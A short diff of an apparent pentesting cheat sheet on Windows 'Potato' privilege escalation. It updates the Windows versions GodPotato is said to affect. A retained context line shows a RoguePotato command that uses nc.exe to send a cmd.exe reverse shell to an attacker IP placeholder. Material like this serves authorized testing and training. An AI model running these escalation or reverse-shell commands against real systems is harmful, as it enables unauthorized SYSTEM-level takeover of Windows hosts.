@@ -107,7 +107,7 @@ c:\Users\Public> .\RoguePotato.exe -r KALI_IP -e "PATH\nc.exe IP PORT -e cmd.exe
 Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions. - [GodPotato](https://github.com/BeichenDream/GodPotato)
 
 {% hint style="danger" %}
-GodPotato will works on **Windows 2012 - Windows 2022 servers**
+GodPotato will works on **Windows 8 - Windows 11**, **Windows 2012 - Windows 2022 servers**
 {% endhint %}
 
 ```bash
